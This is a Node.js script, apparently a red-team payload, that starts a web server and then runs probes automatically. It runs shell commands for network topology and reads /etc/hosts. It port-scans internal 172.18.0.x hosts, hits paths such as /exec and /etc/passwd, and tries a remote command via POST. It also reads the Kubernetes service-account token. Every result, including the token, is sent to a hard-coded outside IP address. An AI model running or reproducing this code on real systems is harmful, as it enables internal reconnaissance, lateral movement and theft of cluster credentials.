const http = require('http');
const net = require('net');

const OOB = 'http://5.39.252.153';
const PORT = process.env.PORT || 3000;

function oobSend(path, data) {
  const body = typeof data === 'string' ? data : JSON.stringify(data);
  const enc = encodeURIComponent(body.slice(0, 2000));
  const opts = {
    hostname: '5.39.252.153', port: 80, method: 'GET',
    path: `/${path}?d=${enc}`, timeout: 6000
  };
  const r = http.request(opts, () => {});
  r.on('error', () => {});
  r.end();
}

function httpProbe(host, port, path, label) {
  return new Promise(resolve => {
    const req = http.request({ hostname: host, port, path, method: 'GET', timeout: 5000 }, res => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve({ label, status: res.statusCode, body: body.slice(0, 500) }));
    });
    req.on('error', e => resolve({ label, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ label, error: 'timeout' }); });
    req.end();
  });
}

function tcpProbe(host, port, label) {
  return new Promise(resolve => {
    const s = new net.Socket();
    s.setTimeout(3000);
    s.connect(port, host, () => { s.destroy(); resolve({ label, open: true }); });
    s.on('error', e => resolve({ label, open: false, error: e.message }));
    s.on('timeout', () => { s.destroy(); resolve({ label, open: false, error: 'timeout' }); });
  });
}

async function runProbes() {
  oobSend('F019RT-START', { time: new Date().toISOString(), pid: process.pid });

  // Network topology
  const { execSync } = require('child_process');
  try {
    const net_info = execSync('ip addr 2>/dev/null; echo "---"; ip route 2>/dev/null; echo "---"; cat /etc/hosts 2>/dev/null', { timeout: 5000 }).toString();
    oobSend('F019RT-NET', net_info);
  } catch(e) { oobSend('F019RT-NET-ERR', e.message); }

  // TCP scan 172.18.0.1-5 on common ports
  const hosts = ['172.18.0.1','172.18.0.2','172.18.0.3','172.18.0.4','172.18.0.5'];
  const ports = [80, 443, 8000, 8080, 8443, 3000, 5000, 6379, 5432, 3306];
  const tcpResults = [];
  for (const h of hosts) {
    for (const p of ports) {
      const r = await tcpProbe(h, p, `${h}:${p}`);
      if (r.open) tcpResults.push(r.label);
    }
  }
  oobSend('F019RT-TCP-OPEN', tcpResults.join(',') || 'none');

  // HTTP probes on 172.18.0.2:8000
  const paths = ['/', '/health', '/api', '/api/v1/', '/exec', '/run', '/containers', '/terminal', '/console', '/ws', '/token', '/metrics', '/status', '/docs', '/openapi.json'];
  const results = await Promise.all(paths.map(p => httpProbe('172.18.0.2', 8000, p, `172.18.0.2:8000${p}`)));
  oobSend('F019RT-8000', results.map(r => `${r.label}:${r.status||r.error}`).join(' | '));

  // Full body for interesting paths
  for (const r of results) {
    if (r.status && r.status !== 404) {
      oobSend(`F019RT-BODY-${r.label.replace(/[/:]/g,'_')}`, `status=${r.status} body=${r.body}`);
    }
  }

  // HTTP probes on 172.18.0.1:80 and 172.18.0.3:80 (ingress/gateway hosts)
  const gwPaths = ['/', '/health', '/api', '/status', '/metrics', '/info', '/.git/HEAD', '/etc/passwd'];
  for (const gwHost of ['172.18.0.1', '172.18.0.3']) {
    const gwResults = await Promise.all(gwPaths.map(p => httpProbe(gwHost, 80, p, `${gwHost}:80${p}`)));
    const summary = gwResults.map(r => `${r.label.split('/').pop()||'/'}:${r.status||r.error}`).join(' | ');
    oobSend(`F019RT-GW-${gwHost.replace(/\./g,'_')}`, summary);
    for (const r of gwResults) {
      if (r.status && r.status < 404) {
        oobSend(`F019RT-GW-BODY-${gwHost.replace(/\./g,'_')}-${r.label.split('/').pop()||'root'}`, `status=${r.status} body=${r.body}`);
      }
    }
  }

  // Also try 172.18.0.2:8000 POST /exec
  const execReq = new Promise(resolve => {
    const body = JSON.stringify({ cmd: 'id' });
    const opts = {
      hostname: '172.18.0.2', port: 8000, path: '/exec', method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
      timeout: 5000
    };
    const req = http.request(opts, res => {
      let b = '';
      res.on('data', d => b += d);
      res.on('end', () => resolve({ status: res.statusCode, body: b.slice(0, 500) }));
    });
    req.on('error', e => resolve({ error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
    req.write(body);
    req.end();
  });
  const execResult = await execReq;
  oobSend('F019RT-EXEC-POST', execResult);

  // k8s service account
  try {
    const token = require('fs').readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8');
    oobSend('F019RT-K8S-TOKEN', token.slice(0, 200));
    // Try k8s API
    const k8s = await httpProbe('kubernetes.default.svc', 443, '/api/', 'k8s-api');
    oobSend('F019RT-K8S-API', k8s);
  } catch(e) { oobSend('F019RT-K8S', 'no_sa: ' + e.message); }

  // 192.168.4.72:8000 (sanctioned SSRF target for reference)
  const ssrfRef = await httpProbe('192.168.4.72', 8000, '/', 'ssrf-ref');
  oobSend('F019RT-SSRF-REF', ssrfRef);

  oobSend('F019RT-DONE', { time: new Date().toISOString() });
}

// HTTP server — always start first
const server = http.createServer((req, res) => {
  if (req.url === '/probe') {
    runProbes().catch(e => oobSend('F019RT-ERR', e.message));
    res.end('probe triggered');
  } else {
    res.end('ok');
  }
});
server.listen(PORT, () => {
  // Run probes after server is up
  setTimeout(() => {
    runProbes().catch(e => oobSend('F019RT-ERR', e.message));
  }, 2000);
});
